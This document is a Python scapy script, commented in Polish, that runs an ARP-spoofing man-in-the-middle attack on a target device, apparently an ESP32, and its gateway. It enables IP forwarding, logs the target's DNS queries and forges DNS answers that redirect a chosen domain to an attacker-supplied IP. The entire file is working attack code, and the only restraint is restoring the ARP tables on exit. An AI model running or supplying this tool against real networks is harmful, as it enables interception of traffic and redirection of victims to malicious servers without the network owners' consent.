#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import dns
import argparse
import sys
import time
import threading

def enable_ip_forwarding():
    print("[*] Enabling IP Forwarding...")
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
    except Exception as e:
        print(f"[-] Could not enable IP forwarding: {e}")

def get_mac(ip, interface):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False, iface=interface)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof_arp(target_ip, target_mac, spoof_ip, interface):
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(packet, verbose=False, iface=interface)

def restore_arp(destination_ip, destination_mac, source_ip, source_mac, interface):
    packet = scapy.Ether(dst=destination_mac) / scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.sendp(packet, count=4, verbose=False, iface=interface)

def main():
    parser = argparse.ArgumentParser(description="DNS Spoofer & Analyzer")
    parser.add_argument("-t", "--target", dest="target_ip", help="Target ESP32 IP", required=True)
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway (Router) IP", required=True)
    parser.add_argument("-i", "--interface", dest="interface", help="Network Interface", default="wlan0")
    parser.add_argument("--spoof-domain", dest="spoof_domain", help="Domain to spoof (e.g. api.weather.com)", default=None)
    parser.add_argument("--fake-ip", dest="fake_ip", help="IP address to return for spoofed domain", default=None)
    options = parser.parse_args()

    # Jeśli podano domenę do spoofowania, trzeba też podać fałszywe IP (zazwyczaj IP atakującego)
    if options.spoof_domain and not options.fake_ip:
        print("[-] Error: You must provide --fake-ip when using --spoof-domain")
        sys.exit(1)

    enable_ip_forwarding()

    print(f"[*] Resolving MAC addresses...")
    target_mac = get_mac(options.target_ip, options.interface)
    gateway_mac = get_mac(options.gateway_ip, options.interface)

    if not target_mac or not gateway_mac:
        print("[-] Could not find MAC addresses.")
        sys.exit(1)

    print(f"[+] Target: {options.target_ip} ({target_mac})")
    print(f"[+] Gateway: {options.gateway_ip} ({gateway_mac})")

    # Funkcja obsługująca pakiety DNS
    def process_packet(packet):
        if packet.haslayer(scapy.DNSQR):
            qname = packet[scapy.DNSQR].qname.decode()
            
            # Filtrujemy zapytania tylko od celu
            if packet.haslayer(scapy.IP) and packet[scapy.IP].src == options.target_ip:
                print(f"[+] DNS Query from Target: {qname}")
                
                # Jeśli uruchomiono tryb spoofingu dla tej domeny
                if options.spoof_domain and options.spoof_domain in qname:
                    print(f"    [!] SPOOFING: {qname} -> {options.fake_ip}")
                    
                    # Tworzymy fałszywą odpowiedź DNS
                    # Zamieniamy src/dst IP i Porty
                    spoofed_pkt = scapy.IP(src=packet[scapy.IP].dst, dst=packet[scapy.IP].src) / \
                                  scapy.UDP(sport=packet[scapy.UDP].dport, dport=packet[scapy.UDP].sport) / \
                                  scapy.DNS(id=packet[scapy.DNS].id, qr=1, aa=1, qd=packet[scapy.DNS].qd, \
                                            an=scapy.DNSRR(rrname=qname, rdata=options.fake_ip))
                    
                    scapy.send(spoofed_pkt, verbose=False, iface=options.interface)

    # Wątek ARP Spoofing
    stop_spoofing = False
    def arp_loop():
        while not stop_spoofing:
            spoof_arp(options.target_ip, target_mac, options.gateway_ip, options.interface)
            spoof_arp(options.gateway_ip, gateway_mac, options.target_ip, options.interface)
            time.sleep(2)

    t = threading.Thread(target=arp_loop)
    t.daemon = True
    t.start()

    print("[*] ARP Spoofing started.")
    print("[*] Sniffing DNS requests... (Press Ctrl+C to stop)")
    
    try:
        # Filtr: UDP port 53
        scapy.sniff(iface=options.interface, filter="udp port 53", prn=process_packet, store=False)
    except KeyboardInterrupt:
        print("\n[!] Stopping...")
        stop_spoofing = True
        restore_arp(options.target_ip, target_mac, options.gateway_ip, gateway_mac, options.interface)
        restore_arp(options.gateway_ip, gateway_mac, options.target_ip, target_mac, options.interface)
        print("[*] ARP Tables restored.")

if __name__ == "__main__":
    main()
